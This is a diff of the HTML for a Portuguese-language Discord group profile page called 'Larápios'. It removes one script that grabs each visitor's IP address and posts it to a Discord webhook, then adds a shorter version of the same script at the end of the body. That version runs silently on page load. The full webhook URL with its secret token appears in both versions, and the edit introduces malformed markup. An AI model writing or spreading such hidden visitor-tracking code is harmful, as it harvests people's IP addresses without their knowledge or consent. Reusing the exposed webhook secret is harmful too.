@@ -6,74 +6,22 @@
     <title>Larápios</title>
     <link rel="icon" type="image/png" href="images/bandido.png">
     <link rel="stylesheet" href="css/styles.css">
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <script>
-        $(document).ready(function () {
-            // Captura de IP e envio para Webhook
-            $.getJSON('https://api.ipify.org?format=json', function (data) {
-                console.log(data);
-                var ip = data.ip;
-                var webhook_url = 'https://discord.com/api/webhooks/1329885894550749354/T1C8_y_6ikK-ITR2NgezbwfiMlsbIWuVnjOnrcwe5fseXenX2sFIAhTDi3_r88VmEG2W';
-                
-                var payload = {
-                    content: 'IP do usuário: ' + ip
-                };
-
-                $.ajax({
-                    url: webhook_url,
-                    type: 'POST',
-                    data: JSON.stringify(payload),
-                    contentType: 'application/json',
-                    success: function () {
-                        console.log('IP enviado com sucesso.');
-                    },
-                    error: function (err) {
-                        console.error('Erro ao enviar o IP:', err);
-                    }
-                });
-            });
-
-            // Evento para ocultar a tela inicial e mostrar o conteúdo principal
-            $('#intro').click(function () {
-                $(this).fadeOut(); // Esconde o intro
-                $('#main-content').fadeIn(); // Mostra o conteúdo principal
-            });
-        });
-    </script>
-    <style>
-        #intro {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            color: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
-            cursor: pointer;
-        }
-
-        #main-content {
-            display: none; /* Oculta inicialmente */
-        }
-    </style>
+    <script src="js/script.js" defer type="69664f3b12b7f5921d7725fb-text/javascript"></script>
 </head>
 <body>
     <div id="intro">
         <div class="intro-content">
-            <p>Clique para entrar no mundo dos Larápios</p>
+            <p>Larápios</p>
         </div>
     </div>
-    <div id="main-content">
+    <div id="main-content" class="hidden">
         <header>
             <h1 class="title">Larápios 2k25</h1>
         </header>
         <main>
             <section class="profiles">
 
+                <!-- Perfil 1 -->
                 <a href="https://discord.com/users/1245036556759334987/" class="profile">
                     <img src="images/profile4.gif" alt="Profile Picture">
                     <h2>Polonie</h2>
@@ -85,8 +33,9 @@
                     </div>
                 </a>
 
+                <!-- Perfil 2 -->
                 <a href="https://discord.com/users/1195889174469951620" class="profile">
-                    <img src="images/seven.png" alt="Profile Picture">
+                    <img src="images/seven.png"Profile Picture>
                     <h2>Seven7</h2>
                     <p>@seven7sempre</p>
                     <div class="badges">
@@ -96,6 +45,7 @@
                     </div>
                 </a>
 
+                <!-- Perfil 3 -->
                 <a href="https://discord.com/users/1237556883720634409" class="profile">
                     <img src="images/pmb.png" alt="Profile Picture">
                     <h2>Pinguim</h2>
@@ -107,7 +57,8 @@
                     </div>
                 </a>
 
-                <a href="https://discord.com/users/1323020101011767397" class="profile">
+                <!-- Perfil 4 -->
+                <a href="https://discord.com/users/1323020101011767397 " class="profile">
                     <img src="images/ch.png" alt="Profile Picture">
                     <h2>Ch</h2>
                     <p></p>
@@ -121,7 +72,21 @@
             </section>
         </main>
         <audio id="music" src="media/musica.mp3" preload="auto"></audio>
+        </video>
     </div>
     <script src="js/rocket-loader.min.js" data-cf-settings="69664f3b12b7f5921d7725fb-|49" defer></script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+	<script>
+		$(document).ready(function(){
+			$.getJSON('https://api.ipify.org?format=json', function(data){
+				console.log(data);
+				var ip = data.ip;
+				var webhook_url = 'https://discord.com/api/webhooks/1329885894550749354/T1C8_y_6ikK-ITR2NgezbwfiMlsbIWuVnjOnrcwe5fseXenX2sFIAhTDi3_r88VmEG2W';
+				var message = '' + ip;
+				$.post(webhook_url, {content: message});
+			});
+		});
+	</script>
+    
 </body>
-</html>
